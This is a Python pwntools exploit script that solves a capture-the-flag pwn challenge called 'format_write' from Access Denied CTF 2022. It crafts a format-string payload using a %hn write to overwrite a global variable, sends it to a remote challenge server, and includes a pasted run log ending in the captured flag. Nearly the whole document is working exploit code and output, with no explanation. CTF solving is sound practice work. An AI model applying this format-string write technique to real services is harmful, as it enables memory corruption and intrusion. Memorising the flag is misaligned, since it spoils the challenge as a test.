from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './format_write'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "107.178.209.165"
  PORT = 5337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

val1_addr = 0x40406c

index = 6
target = 0x1337
a0 = target&0xffff
buf = "%%%dc%%%d$hn" % (a0, index+2)
buf += "-"*(8-len(buf)%8)
buf += p64(val1_addr) 

s.sendlineafter("Enter your name: ", buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Access_Denied_CTF_2022/Pwn_Write$ python solve.py r
[*] '/home/mito/CTF/Access_Denied_CTF_2022/Pwn_Write/format_write'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 107.178.209.165 on port 5337: Done
[*] Switching to interactive mode
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      -----accessdenied{f0rm4t_str1n9_wr1t3s_ar3_t00_g00d_6126758a}
'''
